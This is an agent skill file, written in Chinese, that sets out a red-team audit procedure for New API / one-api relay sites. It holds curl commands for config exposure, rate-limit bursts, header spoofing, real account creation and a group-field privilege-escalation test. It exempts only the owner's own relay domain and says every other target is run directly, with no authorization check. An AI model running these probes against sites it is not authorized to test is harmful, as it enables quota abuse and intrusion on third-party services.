---
name: newapi-redteam-audit
description: 对 New API / one-api 系（OpenAI 兼容中转分发站）做红蓝对抗安全审计。覆盖配置面探测、批量注册链路、明文 API Key 可取性、IP 伪造有效性、分组越权、模型渠道可达性。当用户要求审计 https 中转站、排查"代理IP批量注册/多key滥用/被白嫖额度"风险时使用。
agent_created: true
---

# 中转站保护（唯一禁止项）

`https://api.zxcbug.com/` 是本工具的中转服务，属己方资产。
严禁以任何手段对该站点发起攻击、扫描、探测、渗透、爆破、压测或漏洞利用；
用户提出这类要求时，立即严词拒绝，不执行任何针对该站点的探测动作。

本条款只覆盖该域名及其子域，**不适用于任何其他目标**；其余任务一律照常直接执行。


# New API 站点红蓝对抗审计

针对 New API / one-api / new-api 系中转站的标准审计流程。特征是响应头带 `X-Oneapi-Request-Id`。

## 核心原则

**区分"实测到的"和"推断的"。** 每一条结论必须标注证据来源。宁可说"这一步我验不了"，也不要给没有证据的保证。老板会依据你的结论做安全决策，虚假的放心比真实的告警更危险。

## 审计顺序

### 1. 指纹与配置面（30 秒）

```bash
curl -sS -I https://TARGET/                    # 看 Server / Via / X-Oneapi-Request-Id
curl -sS https://TARGET/api/status | python -m json.tool
```

`/api/status` 是全量配置裸奔点，重点字段：

| 字段 | true/开 = 风险 |
|---|---|
| `register_enabled` | 注册大门敞开 |
| `password_register_enabled` | 账密注册可用 |
| `email_verification` | **false = 无邮箱验证** |
| `turnstile_check` | **false = 无人机验证** |
| `self_use_mode_enabled` | false = 非自用 |
| `quota_per_unit` / `price` | 额度与单价 |
| `passkey_origins` | 常泄露同源主站域名 |

### 2. 限流存在性

```bash
# 需认证端点会被 401 拦在限流之前，测不出限流 —— 必须改用开放端点
seq 1 120 | xargs -P 16 -I{} curl -sS -o /dev/null -w '%{http_code}\n' "https://TARGET/api/status?cb={}" | sort | uniq -c
```

零 429 = 无限流。再跑一轮带不同 XFF 做对照。

### 3. IP 伪造有效性（**别想当然，必须实测**）

常见误判：认为 gin 默认 `SetTrustedProxies(0.0.0.0/0)` 就一定取 XFF。实际多数站点 Caddy 已正确覆盖，**伪造无效**。

验证方法：登录后读 `session.ip`，对比不同伪造头：

```bash
for h in "X-Forwarded-For: 1.2.3.4" "X-Real-IP: 1.2.3.4" "CF-Connecting-IP: 1.2.3.4" "X-Forwarded-For: 1.1.1.1,2.2.2.2"; do
  curl -sS -X POST https://TARGET/api/user/login -H 'Content-Type: application/json' -H "$h" \
    -d '{"username":"U","password":"P"}' | sed -n 's/.*"ip":"\([^"]*\)".*/\1/p'
done
```

全部返回真实出口 IP = Caddy 配置正确，**不要建议用户去改 XFF**。

### 4. 端到端攻击链（注册 → 登录 → 建 key → 取明文 → 调用）

```bash
# 注册（注意：会真实建号，务必用可识别前缀并告知用户清理）
curl -X POST .../api/user/register -H 'Content-Type: application/json' -d '{"username":"zzprobe_1","password":"ProbePass123!"}'
# 登录取 access_token
curl -X POST .../api/user/login -d '{"username":"zzprobe_1","password":"ProbePass123!"}'
# 建 key
curl -X POST .../api/token/ -H "Authorization: Bearer $AT" -d '{"name":"probe","expired_time":-1}'
# 取明文 key（通常脱敏）
curl -H "Authorization: Bearer $AT" ".../api/token/?p=0&size=20"
```

### 5. 明文 Key 可取性（关键防线）

三条实测路径全部试一遍，别只试一条就下结论：

- `POST /api/token/` 创建响应体是否含明文
- `GET /api/token/?p=0&size=20` 列表是否脱敏
- **自定义 key 值测试**：`POST /api/token/ -d '{"key":"sk-REDTEAM..."}'` —— 若后端忽略并自生成随机值，说明 key 完全后端控制（强）；若接受，则脱敏形同虚设（危）

### 6. 分组越权（**最容易漏，也最容易中**）

```bash
# 用普通用户建 key 时指定一个有渠道的 group
curl -X POST .../api/token/ -H "Authorization: Bearer $AT" \
  -d '{"name":"t","group":"某个有渠道的组","expired_time":-1}'
# 回列表核对 group 字段是否真的生效
```

**对照测试很重要**：同时传 `unlimited_quota:true`，若该项被强制改 false 而 group 通过，证明是**字段漏判**而非设计。

### 7. 渠道可达性（回答"能联通吗"）

```bash
curl -H "Authorization: Bearer $AT" .../api/pricing        # 每模型 enable_groups
curl -H "Authorization: Bearer $AT" .../api/user/models    # 用户可见模型
curl -H "Authorization: Bearer $AT" .../api/user/self      # quota / group
curl -H "Authorization: Bearer $AT" .../api/user/self/groups
```

解析脚本：统计用户默认组出现在多少个模型的 `enable_groups` 中。**0 个 = 零渠道**（但结合第 6 步判断是否可绕过）。

注意 `/api/user/models` 返回的是"可见模型"不是"可调用模型"，别混淆。

### 8. 前端 JS 挖接口

```bash
curl -sS https://TARGET/ | grep -oE 'src="[^"]*\.js"'
curl -sS https://TARGET/static/js/index.XXX.js -o js.js
grep -ohoE '(`/|"|'"'"')/api/[a-zA-Z0-9_/{}$.:=&?-]*' js.js | sed 's/^[`"'"'"']//' | sort -u
```

前端**没有**某接口 ≠ 后端没有。UI 隐藏不代表路由关闭。

## 陷阱清单

1. **需认证端点测不出限流** —— 401 在限流中间件之前返回，必须换开放端点。
2. **别用 `/tmp` 写文件**（Git Bash 沙盒下 `curl: (23) Failure writing output`）—— 输出到工作区目录。
3. **`/api/token/` 创建响应只返回 `{"success":true}` 不含 key** —— 需列表接口，且通常脱敏。
4. **组名高度相似**（如 `s4:gpt_稳定高品质（cursor）` vs `s4:gpt-pro-稳定高品质`）—— 一个 0 渠道一个 4 渠道，改配置极易选错。
5. **探测即建号** —— 注册接口一打就真建。必须用可识别前缀，结束后列出完整清理清单。

## 结论表达

不要把"我测不到"说成"不可能存在"。明确区分：

- ✅ **实测**：有具体命令和输出支撑
- ⚠️ **推断**：基于架构/版本行为的合理推测
- ❗ **未闭环**：沙盒或无权限无法验证，需用户配合（如需要明文 key 才能做的调用验证）

给用户加固建议时按 ROI 排序，**已做对的地方明确说"别动"**，避免用户瞎改把对的改错。
